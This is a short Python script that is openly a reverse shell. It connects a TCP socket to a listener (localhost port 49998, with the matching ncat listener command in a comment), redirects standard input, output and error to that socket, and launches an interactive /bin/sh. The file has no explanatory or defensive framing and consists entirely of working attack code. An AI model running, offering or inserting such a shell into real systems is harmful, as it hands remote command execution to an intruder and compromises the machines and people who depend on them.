#!/usr/bin/env python3
import socket, subprocess, os
def main():
    reverseShell()
def reverseShell():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 49998)) # ncat -lnvp 49998
    sock.send(b'[*] Connection Established') 
    os.dup2(sock.fileno(),0)
    os.dup2(sock.fileno(),1) 
    os.dup2(sock.fileno(),2)
    shell_remote = subprocess.call(["/bin/sh", "-i"])
    proc = subprocess.call(["/bin/ls", "-i"])    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
